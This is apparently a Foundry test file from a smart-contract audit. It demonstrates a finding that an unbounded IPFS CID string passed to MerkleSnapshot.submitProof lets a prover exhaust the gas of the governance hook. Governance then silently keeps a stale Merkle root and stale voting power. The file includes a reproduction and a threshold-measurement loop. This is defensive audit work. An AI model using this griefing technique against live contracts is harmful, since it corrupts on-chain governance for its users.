// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {Test, console2} from "forge-std/Test.sol";
import {MerkleSnapshot} from "src/merkle/MerkleSnapshot.sol";
import {MerkleGovModule} from "src/zodiac/MerkleGovModule.sol";
import {IZkVerifier} from "interfaces/merkle/IZkVerifier.sol";
import {IAttestationAccumulator} from "interfaces/merkle/IAttestationAccumulator.sol";
import {IMerkleSnapshotHook} from "interfaces/merkle/IMerkleSnapshotHook.sol";

contract OB_Verifier is IZkVerifier {
    function verify(bytes calldata, bytes32) external pure {}
}

contract OB_Acc is IAttestationAccumulator {
    bytes32 public acc;
    uint64 public leafCount;
    Checkpoint[] internal cps;
    address public snapshot;

    function bind(address s) external {
        snapshot = s;
    }

    function setState(bytes32 a, uint64 l) external {
        acc = a;
        leafCount = l;
    }

    function checkpoint() external returns (uint256 id) {
        require(msg.sender == snapshot, "not snapshot");
        id = cps.length;
        cps.push(Checkpoint({acc: acc, leafCount: leafCount, blockNumber: uint64(block.number)}));
        emit InputsCheckpointed(id, acc, leafCount, uint64(block.number));
    }

    function getCheckpoint(uint256 id) external view returns (Checkpoint memory) {
        return cps[id];
    }

    function checkpointCount() external view returns (uint256) {
        return cps.length;
    }
}

/// FINDING: `MerkleSnapshot.submitProof` accepts an UNBOUNDED `ipfsHashCid` string and forwards
/// the whole `MerkleState` to every hook under a fixed 500,000-gas stipend. A permissionless
/// prover therefore chooses the gas cost of every consumer hook. With a long enough CID the
/// `MerkleGovModule` hook runs out of gas, is swallowed by the try/catch, and governance keeps
/// serving a STALE root and stale total voting power for as long as the prover keeps doing it.
contract OmegaPassB_HookStipend is Test {
    event HookFailed(uint256 indexed hookIndex, address indexed hook);

    MerkleSnapshot internal snap;
    OB_Acc internal acc;
    MerkleGovModule internal gov;

    address internal admin = address(0xC0FFEE);
    address internal safe = address(0x5AFE);

    function setUp() public {
        acc = new OB_Acc();
        snap = new MerkleSnapshot(
            IZkVerifier(address(new OB_Verifier())),
            keccak256("params"),
            IAttestationAccumulator(address(acc)),
            admin,
            admin,
            ""
        );
        acc.bind(address(snap));

        gov = new MerkleGovModule(safe, safe, safe, address(snap));
        vm.prank(admin);
        snap.addHook(IMerkleSnapshotHook(address(gov)));
    }

    function _long(uint256 n) internal pure returns (string memory) {
        bytes memory b = new bytes(n);
        for (uint256 i; i < n; ++i) {
            b[i] = "Q";
        }
        return string(b);
    }

    function _land(bytes32 root, string memory cid, uint256 total) internal returns (uint256 id) {
        acc.setState(keccak256(abi.encode(root)), uint64(uint256(root)));
        vm.roll(block.number + 10);
        id = snap.trigger();
        snap.submitProof(id, root, bytes32(uint256(7)), cid, total, bytes32(0), address(0), "");
    }

    function test_ShortCidUpdatesGovernance() public {
        _land(bytes32(uint256(1)), "QmShortCid", 1_000);
        assertEq(gov.currentMerkleRoot(), bytes32(uint256(1)), "hook ran");
        assertEq(gov.totalVotingPower(), 1_000);
    }

    function test_LongCidSilentlyDesynchronisesGovernance() public {
        // A normal root lands and governance tracks it.
        _land(bytes32(uint256(1)), "QmShortCid", 1_000);
        assertEq(gov.currentMerkleRoot(), bytes32(uint256(1)));

        // The next prover picks a 4 KB CID. The root lands; the hook is skipped (HookFailed).
        _land(bytes32(uint256(2)), _long(4096), 9_999);

        assertEq(snap.getLatestState().root, bytes32(uint256(2)), "snapshot advanced");
        assertEq(gov.currentMerkleRoot(), bytes32(uint256(1)), "governance is STALE");
        assertEq(gov.totalVotingPower(), 1_000, "voting power is STALE");
    }

    /// Find the threshold empirically so the writeup can quote a number.
    function test_MeasureThreshold() public {
        _land(bytes32(uint256(1)), "QmShortCid", 1_000);
        uint256 n = 128;
        while (n <= 8192) {
            uint256 snapshotId = vm.snapshotState();
            _land(bytes32(uint256(2)), _long(n), 9_999);
            bool ok = gov.currentMerkleRoot() == bytes32(uint256(2));
            console2.log("cid bytes", n, ok ? "hook OK" : "hook FAILED");
            vm.revertToState(snapshotId);
            if (!ok) break;
            n *= 2;
        }
    }
}
